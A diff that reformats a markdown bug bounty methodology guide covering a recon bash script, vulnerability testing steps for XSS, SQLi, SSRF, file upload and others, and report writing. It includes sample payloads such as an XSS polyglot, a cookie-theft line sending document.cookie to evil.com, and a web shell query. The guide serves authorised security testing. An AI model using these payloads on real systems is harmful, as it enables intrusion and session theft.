@@ -1,47 +1,82 @@
+---
+title: "Advanced Bug Bounty Hunting Methodology"
+description: "A complete technical workflow for advanced bug bounty hunting, covering reconnaissance, vulnerability discovery, chaining, automation, and professional reporting."
+author: ["name": "Rajendra Pancholi", "email": "rpancholi522@gmail.com" ]
+created: "2026-04-18"
+updated: "2026-04-18"
+thumbnail: "/images/site-definition.png"
+tags: [bugbounty, cybersecurity, websecurity, automation, pentesting]
+keywords: ["Advanced bug bounty methodology", "Recon workflow bug bounty", "Web vulnerabilities guide", "Nuclei automation", "Bug bounty hunting steps"]
+---
+
 # Advanced Bug Bounty Hunting Methodology
 
 This methodology builds on your foundational knowledge, diving into technical workflows for finding high-impact vulnerabilities. It’s structured for efficiency and repeatability, drawing from expert practices and tailored for web, API, and mobile targets.
 
+![Advanced Bug Bounty Hunting Methodology](/images/methodology-bug-hunting.png)
 
-# Create output directory
-mkdir -p "$OUTPUT_DIR"
+## Workflow
 
-# Step 1: Subdomain Enumeration
-echo "[+] Enumerating subdomains for $TARGET..."
-amass enum -d "$TARGET" -o "$SUBDOMAIN_FILE" -passive
-sublist3r -d "$TARGET" -o "$SUBDOMAIN_FILE.tmp"
-cat "$SUBDOMAIN_FILE.tmp" >> "$SUBDOMAIN_FILE"
-rm "$SUBDOMAIN_FILE.tmp"
+- **Create output directory**
 
-# Step 2: Filter live subdomains
-echo "[+] Filtering live subdomains..."
-cat "$SUBDOMAIN_FILE" | httprobe > "$SUBDOMAIN_FILE.live"
-mv "$SUBDOMAIN_FILE.live" "$SUBDOMAIN_FILE"
+  ```bash
+  mkdir -p "$OUTPUT_DIR"
+  ```
 
-# Step 3: URL Crawling
-echo "[+] Crawling URLs with Gau..."
-gau "$TARGET" --subs --threads 10 > "$URL_FILE"
+- **Step 1: Subdomain Enumeration**
 
-# Step 4: Port Scanning
-echo "[+] Scanning ports with Nmap..."
-nmap -iL "$SUBDOMAIN_FILE" -T4 -p- -oN "$OPEN_PORTS_FILE"
+  ```bash
+  echo "[+] Enumerating subdomains for $TARGET..."
+  amass enum -d "$TARGET" -o "$SUBDOMAIN_FILE" -passive
+  sublist3r -d "$TARGET" -o "$SUBDOMAIN_FILE.tmp"
+  cat "$SUBDOMAIN_FILE.tmp" >> "$SUBDOMAIN_FILE"
+  rm "$SUBDOMAIN_FILE.tmp"
+  ```
 
-# Step 5: Screenshot live hosts
-echo "[+] Taking screenshots with EyeWitness..."
-EyeWitness -f "$SUBDOMAIN_FILE" -d "$OUTPUT_DIR/screenshots" --web
+- **Step 2: Filter live subdomains**
 
-# Step 6: Basic vuln scan with Nuclei
-echo "[+] Running Nuclei for basic vuln checks..."
-nuclei -l "$SUBDOMAIN_FILE" -t cves/ -t vulnerabilities/ -o "$OUTPUT_DIR/nuclei_results_$TIMESTAMP.txt"
+  ```bash
+  echo "[+] Filtering live subdomains..."
+  cat "$SUBDOMAIN_FILE" | httprobe > "$SUBDOMAIN_FILE.live"
+  mv "$SUBDOMAIN_FILE.live" "$SUBDOMAIN_FILE"
+  ```
 
-echo "[+] Recon complete. Results saved in $OUTPUT_DIR"
-</xaiArtifact>
+- **Step 3: URL Crawling**
+
+  ```bash
+  echo "[+] Crawling URLs with Gau..."
+  gau "$TARGET" --subs --threads 10 > "$URL_FILE"
+  ```
+
+- **Step 4: Port Scanning**
+
+  ```bash
+  echo "[+] Scanning ports with Nmap..."
+  nmap -iL "$SUBDOMAIN_FILE" -T4 -p- -oN "$OPEN_PORTS_FILE"
+  ```
+
+- **Step 5: Screenshot live hosts**
+
+  ```bash
+  echo "[+] Taking screenshots with EyeWitness..."
+  EyeWitness -f "$SUBDOMAIN_FILE" -d "$OUTPUT_DIR/screenshots" --web
+  ```
+
+- **Step 6: Basic vuln scan with Nuclei**
+
+  ```bash
+  echo "[+] Running Nuclei for basic vuln checks..."
+  nuclei -l "$SUBDOMAIN_FILE" -t cves/ -t vulnerabilities/ -o "$OUTPUT_DIR/nuclei_results_$TIMESTAMP.txt"
+
+  echo "[+] Recon complete. Results saved in $OUTPUT_DIR"
+  ```
 
 ---
 
-### Step-by-Step Technical Methodology
+## Step-by-Step Technical Methodology
 
-#### 1. **Preparation and Target Selection**
+### 1. Preparation and Target Selection
+
 - **Choose a Program**: Select a program from platforms like HackerOne, Bugcrowd, or Intigriti based on your expertise (e.g., web apps, APIs). Prioritize programs with broad scopes or recent updates, as they’re less picked over.
 - **Understand the Target**:
   - Use the app as a normal user to map functionality (e.g., login, profile, payment flows).
@@ -52,7 +87,7 @@ echo "[+] Recon complete. Results saved in $OUTPUT_DIR"
   - Use a VPS for external testing (e.g., RFI, SSRF). Recommended: AWS Lightsail or Linode ($5-$10/month).
   - Install recon tools: Amass, Sublist3r, httprobe, Gau, Nuclei, EyeWitness.
 
-#### 2. **Advanced Reconnaissance**
+### 2. Advanced Reconnaissance
 Recon is critical to uncovering hidden assets. Use a layered approach to maximize coverage.
 
 - **Subdomain Enumeration**:
@@ -81,7 +116,7 @@ Recon is critical to uncovering hidden assets. Use a layered approach to maximiz
 
 **Output**: Save results in organized folders (e.g., `recon/target.com/subdomains.txt`, `recon/target.com/urls.txt`). Use the provided script for automation.
 
-#### 3. **Vulnerability Discovery**
+### 3. Vulnerability Discovery
 Test systematically across the attack surface. Combine manual and automated approaches for efficiency.
 
 - **Broken Access Control/IDOR**:
@@ -92,6 +127,7 @@ Test systematically across the attack surface. Combine manual and automated appr
 
 - **Cross-Site Scripting (XSS)**:
   - **Stored**: Inject payloads like `<script>alert(document.cookie)</script>` or polyglots in inputs (e.g., comments, profiles).
+
     ```javascript:disable-run
     javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'
     ```
@@ -152,7 +188,7 @@ Test systematically across the attack surface. Combine manual and automated appr
   - Test S3 buckets: `curl -s http://bucket.target.com.s3.amazonaws.com`.
   - Check for IAM role abuse in SSRF scenarios.
 
-#### 4. **Chaining Vulnerabilities**
+### 4. Chaining Vulnerabilities
 Maximize impact by combining vulnerabilities:
 - **XSS + CSRF**: Use XSS to submit CSRF payloads on behalf of users.
 - **IDOR + SSRF**: Access internal APIs via SSRF, then exploit IDOR for data leaks.
@@ -160,7 +196,7 @@ Maximize impact by combining vulnerabilities:
 - **SSTI + RCE**: Escalate SSTI to command execution.
 Example: Chain XSS with session theft to hijack admin accounts.
 
-#### 5. **Validation and PoC Development**
+### 5. Validation and PoC Development
 - **Prove Impact**:
   - For XSS: Show cookie theft or account takeover.
   - For SQLi: Extract sample data (e.g., usernames).
@@ -170,7 +206,7 @@ Example: Chain XSS with session theft to hijack admin accounts.
   - Record videos with OBS Studio or screenshots for PoCs.
 - **Severity**: Calculate CVSS score (use online calculators) to quantify impact (e.g., Critical for RCE, High for XSS).
 
-#### 6. **Reporting**
+### 6. Reporting
 Craft professional reports to maximize rewards:
 - **Structure**:
   - **Title**: Clear and specific (e.g., “Stored XSS in Profile Page Leading to Account Takeover”).
@@ -180,6 +216,7 @@ Craft professional reports to maximize rewards:
   - **PoC**: Include code, HTTP requests, or video links.
   - **Recommendation**: Suggest fixes (e.g., “Implement Content Security Policy for XSS”).
 - **Example Report**:
+
   ```markdown
   # Stored XSS in Comment Section
   **Severity**: High (CVSS 7.5)
@@ -194,14 +231,15 @@ Craft professional reports to maximize rewards:
   ```
 - **Submission**: Use the program’s portal (e.g., HackerOne). Follow up politely if triaged slowly.
 
-#### 7. **Post-Report Actions**
+### 7. Post-Report Actions
 - Monitor for patches; request permission for public disclosure.
 - Learn from feedback: Study duplicate reports or rejected submissions to improve.
 - Share write-ups (post-patch) on Medium or X to build reputation.
 
 ---
 
-### Technical Workflow Example
+## Technical Workflow Example
+
 **Target**: example.com (public program on HackerOne).
 1. **Recon**:
    - Run `bash bug_bounty_recon_script.sh example.com recon_output`.
@@ -222,7 +260,7 @@ Craft professional reports to maximize rewards:
 
 ---
 
-### Advanced Tools and Techniques
+## Advanced Tools and Techniques
 - **Burp Suite Extensions**:
   - **Autorize**: Automate IDOR testing.
   - **Turbo Intruder**: Custom scripts for race conditions or fuzzing.
@@ -245,7 +283,7 @@ Craft professional reports to maximize rewards:
 
 ---
 
-### Best Practices for Scaling
+## Best Practices for Scaling
 - **Specialize**: Focus on niches like GraphQL, Web3, or IoT. Learn their unique vulns (e.g., GraphQL introspection, smart contract reentrancy).
 - **Automate Wisely**: Use tools like Nuclei for low-hanging fruit but prioritize manual testing for high-impact bugs.
 - **Stay Updated**: Follow X accounts (@nahamsec, @bugcrowd) and read write-ups on HackerOne or Medium.
@@ -257,7 +295,7 @@ Craft professional reports to maximize rewards:
 
 ---
 
-### Common Pitfalls to Avoid
+## Common Pitfalls to Avoid
 - **Over-Automation**: Automated scans often miss business logic flaws or chained vulns.
 - **Scope Violations**: Stick to in-scope assets; testing `*.target.com` when only `app.target.com` is allowed risks bans.
 - **Low-Impact Reports**: Avoid submitting self-XSS or missing headers unless explicitly in scope.
@@ -265,7 +303,7 @@ Craft professional reports to maximize rewards:
 
 ---
 
-### Rewards and Expectations
+## Rewards and Expectations
 - **Payouts** (2025 estimates):
   - Low (e.g., misconfigs): $50-$500.
   - Medium (e.g., XSS, CSRF): $500-$2,000.
@@ -275,7 +313,7 @@ Craft professional reports to maximize rewards:
 
 ---
 
-### Next Steps
+## Next Steps
 - Practice on CTFs (Hack The Box, TryHackMe) to simulate real-world targets.
 - Hunt on VDPs to build skills without legal risks.
 - Write a custom tool (e.g., Python script for IDOR fuzzing) to automate repetitive tasks.
@@ -285,9 +323,10 @@ This methodology, combined with the provided recon script, should give you a rob
 
 ---
 
-# common web vulnerabilities
+## common web vulnerabilities
 
-### 1. **Cross-Site Scripting (XSS)**
+### 1. Cross-Site Scripting (XSS)
+
    - **Overview**: Injects malicious scripts for session theft or phishing (Reflected, Stored, DOM-based).
    - **Tools**: Burp Suite, XSStrike.
    - **Steps**:
@@ -299,7 +338,8 @@ This methodology, combined with the provided recon script, should give you a rob
      6. Escalate: Show cookie theft (`document.location='http://evil.com?cookie='+document.cookie`).
      7. Report: Payload, steps, impact (e.g., account takeover).
 
-### 2. **SQL Injection (SQLi)**
+### 2. SQL Injection (SQLi)
+
    - **Overview**: Exploits database queries to extract/modify data.
    - **Tools**: SQLmap, Burp Suite.
    - **Steps**:
@@ -311,7 +351,8 @@ This methodology, combined with the provided recon script, should give you a rob
      6. Bypass: Use encodings, case variations (`UnIoN`).
      7. Report: PoC query, sample data, impact (e.g., DB dump).
 
-### 3. **Insecure Direct Object Reference (IDOR) / Broken Access Control**
+### 3. Insecure Direct Object Reference (IDOR) / Broken Access Control
+
    - **Overview**: Access unauthorized data by manipulating references.
    - **Tools**: Burp Suite (Autorize).
    - **Steps**:
@@ -322,7 +363,8 @@ This methodology, combined with the provided recon script, should give you a rob
      5. Escalate: Note PII exposure (GDPR).
      6. Report: Screenshots, request, impact (e.g., data leak).
 
-### 4. **Cross-Site Request Forgery (CSRF)**
+### 4. Cross-Site Request Forgery (CSRF)
+
    - **Overview**: Forges user actions without consent.
    - **Tools**: Burp Suite.
    - **Steps**:
@@ -333,7 +375,8 @@ This methodology, combined with the provided recon script, should give you a rob
      5. Bypass: Omit/reuse tokens; test GET methods.
      6. Report: PoC code, video, fix (e.g., CSRF tokens).
 
-### 5. **Server-Side Request Forgery (SSRF)**
+### 5. Server-Side Request Forgery (SSRF)
+
    - **Overview**: Makes server send unauthorized requests to internal/external resources.
    - **Tools**: Burp Suite (Collaborator), SSRFmap.
    - **Steps**:
@@ -345,7 +388,8 @@ This methodology, combined with the provided recon script, should give you a rob
      6. Escalate: Chain to RCE or data exfil.
      7. Report: PoC URL, accessed data, impact (e.g., cloud creds).
 
-### 6. **File Upload Vulnerabilities**
+### 6. File Upload Vulnerabilities
+
    - **Overview**: Uploads malicious files for RCE or XSS.
    - **Tools**: Burp Intruder.
    - **Steps**:
@@ -356,7 +400,8 @@ This methodology, combined with the provided recon script, should give you a rob
      5. Execute: Access `/uploads/shell.php?cmd=id`.
      6. Report: Request, URL, execution PoC.
 
-### 7. **Broken Authentication**
+### 7. Broken Authentication
+
    - **Overview**: Bypasses login or hijacks sessions.
    - **Tools**: Burp Session Hijacker.
    - **Steps**:
@@ -367,7 +412,8 @@ This methodology, combined with the provided recon script, should give you a rob
      5. Hijack: Swap cookies between accounts.
      6. Report: Video of bypass, impact (e.g., admin access).
 
-### 8. **Open Redirects**
+### 8. Open Redirects
+
    - **Overview**: Redirects to attacker-controlled URLs.
    - **Tools**: Burp Suite.
    - **Steps**:
@@ -377,7 +423,8 @@ This methodology, combined with the provided recon script, should give you a rob
      4. Chain: Combine with XSS/CSRF.
      5. Report: PoC URL, phishing risk.
 
-### 9. **Rate Limiting / Brute-Force**
+### 9. Rate Limiting / Brute-Force
+
    - **Overview**: Allows unlimited login/API attempts.
    - **Tools**: Burp Intruder.
    - **Steps**:
@@ -387,7 +434,8 @@ This methodology, combined with the provided recon script, should give you a rob
      4. Bypass: Rotate IPs, add delays.
      5. Report: Request count, PoC script.
 
-### 10. **Information Disclosure**
+### 10. Information Disclosure
+
     - **Overview**: Leaks configs, creds, or PII.
     - **Tools**: Gau, Nikto.
     - **Steps**:
@@ -398,6 +446,3 @@ This methodology, combined with the provided recon script, should give you a rob
       5. Report: File URL, exposed data.
 
 ---
-
-
-
